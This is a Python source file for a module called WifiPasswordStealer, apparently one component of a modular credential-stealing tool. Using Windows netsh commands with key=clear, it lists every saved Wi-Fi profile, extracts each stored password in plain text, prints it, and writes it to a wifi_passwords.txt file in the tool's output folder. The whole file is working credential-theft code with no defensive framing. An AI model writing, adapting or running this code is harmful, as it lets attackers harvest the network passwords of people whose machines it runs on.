import os
import subprocess

from config import ModuleManager


class WifiPasswordStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "WifiPasswordStealer")

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
        self.wifi_passwords_filename = os.path.join(self.systeminfo_folder, 'wifi_passwords.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
    
    def run(self) -> None:
        with open(self.wifi_passwords_filename, 'w+') as file:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        print ("{:<30}|  {:<}".format(i, results[0]))
                        file.write("\n{:<30}|  {:<}".format(i, results[0]))
                    except IndexError:
                        print ("{:<30}|  {:<}".format(i, ""))
                        file.write("\n{:<30}|  {:<}".format(i, ""))
                except subprocess.CalledProcessError:
                    print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
                    file.write("\n{:<30}|  {:<}".format(i, "ENCODING ERROR"))
                except Exception as e:
                    print("Error: ", e)
        
        
        